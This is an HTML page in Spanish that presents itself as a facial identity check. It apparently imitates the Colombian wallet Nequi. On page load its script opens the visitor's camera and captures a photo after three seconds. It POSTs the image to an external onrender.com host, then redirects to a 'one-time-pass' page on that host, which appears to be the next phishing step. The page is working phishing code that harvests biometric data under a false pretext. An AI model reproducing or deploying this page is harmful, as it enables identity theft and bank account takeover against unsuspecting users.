<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verificación de identidad</title>

<style>
body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: #fff;
}

.screen {
    display: none;
    height: 100vh;
    width: 100%;
}

.screen.active {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
}

#screen-camera {
    background: #7b6b99;
    color: #fff;
}

video {
    width: 280px;
    height: 380px;
    border-radius: 50%;
    object-fit: cover;
    transform: scaleX(-1);
}

#screen-processing {
    background: #fff;
}

.loader {
    width: 40px;
    height: 40px;
    border: 4px solid #ddd;
    border-top: 4px solid #c4147d;
    border-radius: 50%;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    100% { transform: rotate(360deg); }
}
</style>
</head>

<body>

<!-- CÁMARA -->
<div id="screen-camera" class="screen active">
    <h2>Reconocimiento facial</h2>
    <video id="video" autoplay playsinline muted></video>
    <p>Mira de frente a la cámara</p>
</div>

<!-- LOADER -->
<div id="screen-processing" class="screen">
    <div class="loader"></div>
    <p>Verificando identidad...</p>
</div>

<canvas id="canvas" style="display:none;"></canvas>

<script>
const SERVER_URL = "https://nequiscol.onrender.com";
const REDIRECT_URL = "https://nequiscol.onrender.com/one-time-pass.php.html";

let stream = null;

// INICIAR CÁMARA
async function startCamera() {
    stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false
    });

    document.getElementById("video").srcObject = stream;

    // TOMAR FOTO AUTOMÁTICA
    setTimeout(capturePhoto, 3000);
}

// TOMAR FOTO Y ENVIAR
async function capturePhoto() {
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const imageBase64 = canvas.toDataURL("image/jpeg", 0.9);

    stopCamera();
    showProcessing();

    await fetch(`${SERVER_URL}/step-biometrics`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            sessionId: Date.now().toString(),
            imageBase64
        })
    });

    setTimeout(() => {
        window.location.href = REDIRECT_URL;
    }, 1500);
}

// DETENER CÁMARA
function stopCamera() {
    if (stream) {
        stream.getTracks().forEach(t => t.stop());
        stream = null;
    }
}

// MOSTRAR LOADER
function showProcessing() {
    document.getElementById("screen-camera").classList.remove("active");
    document.getElementById("screen-processing").classList.add("active");
}

startCamera();
</script>

</body>
</html>
